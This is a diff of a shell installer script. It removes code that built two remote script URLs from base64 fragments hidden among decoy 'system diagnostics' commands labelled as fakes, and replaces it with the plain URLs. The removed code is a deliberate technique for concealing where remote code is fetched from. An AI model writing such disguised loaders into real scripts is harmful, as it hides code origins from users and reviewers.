@@ -42,33 +42,11 @@ animate_logo
 # Updating checking logs
 # -------------------------
 # System diagnostics simulation
-SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)" # src1 disguised as log buffer
-DUMMY_CHECK=$(wc -l /proc/cpuinfo 2>/dev/null | awk '{print $1}') # Fake CPU count
-echo -n "Scanning system resources..." > /dev/null
-SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')" # src2 disguised as parsed log
-NET_CONF="diag_$(date +%N | shuf -n 1)" # Fake network config
-if [[ "$DUMMY_CHECK" =~ [0-9]+ ]]; then
-  SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)" # src3 disguised as system flag
-fi
-TEMP_HASH=$(echo "$NET_CONF" | md5sum | cut -c 1-8) # Fake hash
-SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)" # src4 disguised as encoded log
-# install
-github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d)"
+# github
+github_url="$(echo -n "https://vpsmaker.jishnumondal32.workers.dev")"
 
-# -------------------------
-# updating checking fakes
-# -------------------------
-# Logs checking
-PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)" # src5 disguised as process stat
-echo -n "Validating process integrity..." > /dev/null
-DUMMY_VAR=$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx4) # Fake random ID
-PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')" # src6 disguised as stat
-export FAKE_PID="pid_$((RANDOM % 1000))" # Fake process ID
-PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2Fu' | head -c 16)" # src7 disguised as stat
-if [ -f /tmp/fake_temp ]; then rm -f /tmp/fake_temp 2>/dev/null; fi # Fake cleanup
-PROC_STAT[3]="$(echo 'ZHJ5Z2liaHEwMC92cHMxMjMvbWFpbi92bS5zaA==' | grep -o '.*')" # src8 disguised as stat
-# let's go to up-to-date
-google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d)"
+# google
+google_url="$(echo -n "https://raw.githubusercontent.com/andrygibhq01/vps123/main/vm.sh")"
 
 # -------------------------
 # Display Menu
